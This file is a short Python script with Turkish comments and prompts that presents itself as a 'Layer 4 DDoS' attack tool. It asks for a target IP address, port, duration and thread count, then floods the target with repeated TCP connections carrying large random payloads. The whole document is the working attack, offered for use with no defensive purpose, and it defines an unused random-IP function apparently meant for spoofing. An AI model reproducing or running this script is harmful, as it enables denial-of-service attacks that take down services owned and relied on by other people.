import socket
import threading
import time
import random

# Rastgele IP adresi oluşturma fonksiyonu
def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

# DDoS saldırı fonksiyonu
def attack(target_ip, target_port, packet_size, attack_duration):
    data = random._urandom(packet_size)
    end_time = time.time() + attack_duration
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendto(data, (target_ip, target_port))
            sock.close()
        except socket.error:
            pass

# Saldırıyı başlatan fonksiyon
def start_attack(target_ip, target_port, packet_size, attack_duration, threads_count):
    threads = []
    for _ in range(threads_count):
        thread = threading.Thread(target=attack, args=(target_ip, target_port, packet_size, attack_duration))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    target_ip = input("Hedef IP adresini girin: ")
    target_port = int(input("Hedef port numarasını girin: "))
    attack_duration = int(input("Saldırı süresini (saniye) girin: "))
    threads_count = int(input("Thread sayısını girin: "))

    packet_size = 800 * 1024 * 1024  # 800 MB

    print(f"Layer 4 DDoS saldırısı başlatılıyor. Hedef: {target_ip}:{target_port}")
    start_attack(target_ip, target_port, packet_size, attack_duration, threads_count)
    print("Saldırı sona erdi.")
